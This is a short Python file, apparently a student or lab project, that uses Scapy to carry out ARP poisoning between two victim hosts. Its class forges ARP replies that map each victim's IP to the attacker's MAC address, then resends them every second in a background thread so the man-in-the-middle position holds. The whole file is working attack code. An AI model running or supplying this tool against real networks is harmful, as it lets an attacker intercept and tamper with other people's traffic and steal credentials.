from scapy.all import *
import time
import threading

from scapy.layers.l2 import Ether, ARP

# class that contains code for the arp poisoning
class ArpPoisoning:
    # initialize the mac and ips of the victims, attacker and interface to send packages through
    def __init__(self, ip_victim1, ip_victim2, mac_attacker, ip_attacker, interface):
        self.ip_victim1 = ip_victim1
        self.ip_victim2 = ip_victim2
        self.mac_attacker = mac_attacker
        self.ip_attacker = ip_attacker
        self.interface = interface

    # create arp package
    def create_pack(self, mac_attacker, ip_to_spoof, ip_victim):
        arp = Ether() / ARP()
        arp[Ether].src = mac_attacker
        arp[ARP].hwsrc = mac_attacker
        arp[ARP].psrc = ip_to_spoof
        arp[ARP].hwdst = "00:00:00:00:00:00"
        arp[ARP].pdst = ip_victim

        return arp

    # refresh arp tables in case victim updates itself
    def maintain_arp_poison(self, arp1, arp2):
        while True:
            sendp(arp1, iface=self.interface)
            sendp(arp2, iface=self.interface)
            time.sleep(1)

    # execute the arp poisoning
    def execute_poisoning(self):
        arp1 = self.create_pack(self.mac_attacker, self.ip_victim1, self.ip_victim2)
        arp2 = self.create_pack(self.mac_attacker, self.ip_victim2, self.ip_victim1)

        thread_arp_poison = threading.Thread(target=self.maintain_arp_poison, args=(arp1, arp2))
        thread_arp_poison.start()
